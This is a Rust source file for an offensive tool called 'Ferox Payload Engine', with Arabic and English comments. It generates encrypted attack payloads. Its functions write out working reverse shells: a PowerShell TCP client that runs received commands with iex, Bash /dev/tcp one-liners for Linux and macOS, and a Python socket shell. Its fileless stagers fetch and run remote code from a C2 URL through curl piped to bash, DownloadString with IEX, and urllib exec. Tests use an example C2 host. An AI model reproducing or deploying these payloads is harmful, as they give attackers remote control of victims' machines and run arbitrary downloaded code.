// Ferox Payload Engine - محرك الحمولات الذكي
// Smart Payload System with Encryption & Multi-Stage Generation

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use hkdf::Hkdf;
use rand::RngCore;
use sha2::Sha256;
use std::fmt;

/// نتيجة توليد الحمولة | Payload Generation Result
#[derive(Debug, Clone)]
pub struct PayloadResult {
    /// الحمولة المشفرة | Encrypted payload
    pub encrypted: Vec<u8>,
    /// الحمولة بصيغة Base64 | Base64 encoded payload
    pub base64: String,
    /// معرف فريد | Unique identifier
    pub payload_id: String,
    /// نظام التشغيل المستهدف | Target OS
    pub target_os: TargetOS,
    /// نوع الحمولة | Payload type
    pub payload_type: PayloadType,
    /// البيانات الوصفية | Metadata
    pub metadata: PayloadMetadata,
}

/// أنظمة التشغيل المدعومة | Supported Operating Systems
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum TargetOS {
    Windows,
    Linux,
    MacOS,
    Universal,
}

/// أنواع الحمولات | Payload Types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadType {
    ReverseTcp,
    BindShell,
    FilelessStager,
    MeterpreterStage,
    CustomShellcode,
}

/// البيانات الوصفية للحمولة | Payload Metadata
#[derive(Debug, Clone)]
pub struct PayloadMetadata {
    pub created_at: String,
    pub size_bytes: usize,
    pub encryption_method: String,
    pub stage: u8,
    pub c2_channel: Option<String>,
}

impl fmt::Display for TargetOS {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TargetOS::Windows => write!(f, "Windows"),
            TargetOS::Linux => write!(f, "Linux"),
            TargetOS::MacOS => write!(f, "macOS"),
            TargetOS::Universal => write!(f, "Universal"),
        }
    }
}

impl fmt::Display for PayloadType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            PayloadType::ReverseTcp => write!(f, "Reverse TCP"),
            PayloadType::BindShell => write!(f, "Bind Shell"),
            PayloadType::FilelessStager => write!(f, "Fileless Stager"),
            PayloadType::MeterpreterStage => write!(f, "Meterpreter Stage"),
            PayloadType::CustomShellcode => write!(f, "Custom Shellcode"),
        }
    }
}

/// محرك الحمولات الرئيسي | Main Payload Engine
pub struct PayloadEngine {
    /// مفتاح التشفير الرئيسي | Master encryption key
    master_key: Vec<u8>,
    /// شفرة AES-256-GCM | AES-256-GCM cipher
    cipher: Aes256Gcm,
}

impl PayloadEngine {
    /// إنشاء محرك جديد | Create new engine
    pub fn new(master_key: &[u8]) -> Result<Self, String> {
        if master_key.len() < 32 {
            return Err("Master key must be at least 32 bytes".to_string());
        }

        // استخدام HKDF لاشتقاق مفتاح قوي | Use HKDF for strong key derivation
        let hk = Hkdf::<Sha256>::new(None, master_key);
        let mut derived_key = [0u8; 32];
        hk.expand(b"ferox-payload-engine-v1", &mut derived_key)
            .map_err(|e| format!("HKDF expansion failed: {}", e))?;

        let cipher = Aes256Gcm::new(&derived_key.into());

        Ok(Self {
            master_key: derived_key.to_vec(),
            cipher,
        })
    }

    /// توليد محرك بمفتاح عشوائي | Generate engine with random key
    pub fn new_random() -> Result<Self, String> {
        let mut key = vec![0u8; 32];
        OsRng.fill_bytes(&mut key);
        Self::new(&key)
    }

    /// توليد حمولة Reverse TCP | Generate Reverse TCP Payload
    pub fn generate_reverse_tcp(
        &self,
        host: &str,
        port: u16,
        target_os: TargetOS,
    ) -> Result<PayloadResult, String> {
        // توليد shellcode حسب نظام التشغيل | Generate OS-specific shellcode
        let shellcode = match target_os {
            TargetOS::Windows => self.generate_windows_reverse_tcp(host, port),
            TargetOS::Linux => self.generate_linux_reverse_tcp(host, port),
            TargetOS::MacOS => self.generate_macos_reverse_tcp(host, port),
            TargetOS::Universal => self.generate_universal_reverse_tcp(host, port),
        };

        // تشفير الحمولة | Encrypt payload
        let encrypted = self.encrypt_payload(&shellcode)?;
        let base64 = BASE64.encode(&encrypted);
        let payload_id = self.generate_payload_id();

        Ok(PayloadResult {
            encrypted,
            base64,
            payload_id,
            target_os,
            payload_type: PayloadType::ReverseTcp,
            metadata: PayloadMetadata {
                created_at: chrono::Utc::now().to_rfc3339(),
                size_bytes: shellcode.len(),
                encryption_method: "AES-256-GCM".to_string(),
                stage: 1,
                c2_channel: None,
            },
        })
    }

    /// توليد Stager بدون ملفات | Generate Fileless Stager
    pub fn generate_fileless_stager(
        &self,
        c2_url: &str,
        target_os: TargetOS,
    ) -> Result<PayloadResult, String> {
        let stager = match target_os {
            TargetOS::Windows => self.generate_windows_stager(c2_url),
            TargetOS::Linux => self.generate_linux_stager(c2_url),
            TargetOS::MacOS => self.generate_macos_stager(c2_url),
            TargetOS::Universal => self.generate_universal_stager(c2_url),
        };

        let encrypted = self.encrypt_payload(&stager)?;
        let base64 = BASE64.encode(&encrypted);
        let payload_id = self.generate_payload_id();

        Ok(PayloadResult {
            encrypted,
            base64,
            payload_id,
            target_os,
            payload_type: PayloadType::FilelessStager,
            metadata: PayloadMetadata {
                created_at: chrono::Utc::now().to_rfc3339(),
                size_bytes: stager.len(),
                encryption_method: "AES-256-GCM".to_string(),
                stage: 1,
                c2_channel: Some(c2_url.to_string()),
            },
        })
    }

    /// تشفير الحمولة | Encrypt Payload
    pub fn encrypt_payload(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        // توليد nonce عشوائي | Generate random nonce
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        // تشفير البيانات | Encrypt data
        let ciphertext = self
            .cipher
            .encrypt(nonce, data)
            .map_err(|e| format!("Encryption failed: {}", e))?;

        // دمج nonce مع البيانات المشفرة | Combine nonce with ciphertext
        let mut result = nonce_bytes.to_vec();
        result.extend_from_slice(&ciphertext);

        Ok(result)
    }

    /// فك تشفير الحمولة | Decrypt Payload
    pub fn decrypt_payload(&self, encrypted: &[u8]) -> Result<Vec<u8>, String> {
        if encrypted.len() < 12 {
            return Err("Invalid encrypted payload".to_string());
        }

        // استخراج nonce | Extract nonce
        let (nonce_bytes, ciphertext) = encrypted.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);

        // فك التشفير | Decrypt
        self.cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| format!("Decryption failed: {}", e))
    }

    // ========== Windows Payloads ==========

    fn generate_windows_reverse_tcp(&self, host: &str, port: u16) -> Vec<u8> {
        format!(
            r#"
# Windows PowerShell Reverse TCP - Fileless
$client = New-Object System.Net.Sockets.TCPClient('{}', {});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"#,
            host, port
        )
        .into_bytes()
    }

    fn generate_windows_stager(&self, c2_url: &str) -> Vec<u8> {
        format!(
            r#"
# Windows Fileless Stager - Memory Only
$url = '{}';
$wc = New-Object System.Net.WebClient;
$payload = $wc.DownloadString($url);
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
IEX $decoded
"#,
            c2_url
        )
        .into_bytes()
    }

    // ========== Linux Payloads ==========

    fn generate_linux_reverse_tcp(&self, host: &str, port: u16) -> Vec<u8> {
        format!(
            r#"#!/bin/bash
# Linux Reverse TCP Shell - Fileless
bash -i >& /dev/tcp/{}/{} 0>&1
"#,
            host, port
        )
        .into_bytes()
    }

    fn generate_linux_stager(&self, c2_url: &str) -> Vec<u8> {
        format!(
            r#"#!/bin/bash
# Linux Fileless Stager
curl -s {} | bash
"#,
            c2_url
        )
        .into_bytes()
    }

    // ========== macOS Payloads ==========

    fn generate_macos_reverse_tcp(&self, host: &str, port: u16) -> Vec<u8> {
        format!(
            r#"#!/bin/bash
# macOS Reverse TCP Shell
bash -i >& /dev/tcp/{}/{} 0>&1
"#,
            host, port
        )
        .into_bytes()
    }

    fn generate_macos_stager(&self, c2_url: &str) -> Vec<u8> {
        format!(
            r#"#!/bin/bash
# macOS Fileless Stager
curl -s {} | bash
"#,
            c2_url
        )
        .into_bytes()
    }

    // ========== Universal Payloads ==========

    fn generate_universal_reverse_tcp(&self, host: &str, port: u16) -> Vec<u8> {
        format!(
            r#"
# Universal Cross-Platform Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{}',{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
"#,
            host, port
        )
        .into_bytes()
    }

    fn generate_universal_stager(&self, c2_url: &str) -> Vec<u8> {
        format!(
            r#"
# Universal Python Stager
import urllib.request,base64
exec(urllib.request.urlopen('{}').read())
"#,
            c2_url
        )
        .into_bytes()
    }

    // ========== Utilities ==========

    fn generate_payload_id(&self) -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        format!("FRX-{:08X}", rng.gen::<u32>())
    }

    /// الحصول على معلومات المحرك | Get engine info
    pub fn info(&self) -> String {
        format!(
            "Ferox Payload Engine v1.0\nEncryption: AES-256-GCM\nKey Derivation: HKDF-SHA256"
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_engine_creation() {
        let key = b"test_master_key_32_bytes_long!!!";
        let engine = PayloadEngine::new(key).unwrap();
        println!("{}", engine.info());
    }

    #[test]
    fn test_encryption_decryption() {
        let engine = PayloadEngine::new_random().unwrap();
        let data = b"test payload data";
        let encrypted = engine.encrypt_payload(data).unwrap();
        let decrypted = engine.decrypt_payload(&encrypted).unwrap();
        assert_eq!(data.to_vec(), decrypted);
    }

    #[test]
    fn test_reverse_tcp_generation() {
        let engine = PayloadEngine::new_random().unwrap();
        let payload = engine
            .generate_reverse_tcp("192.168.1.100", 4444, TargetOS::Windows)
            .unwrap();
        assert!(!payload.base64.is_empty());
        assert_eq!(payload.payload_type, PayloadType::ReverseTcp);
    }

    #[test]
    fn test_stager_generation() {
        let engine = PayloadEngine::new_random().unwrap();
        let payload = engine
            .generate_fileless_stager("https://c2.example.com/stage2", TargetOS::Linux)
            .unwrap();
        assert!(!payload.base64.is_empty());
        assert_eq!(payload.payload_type, PayloadType::FilelessStager);
    }
}
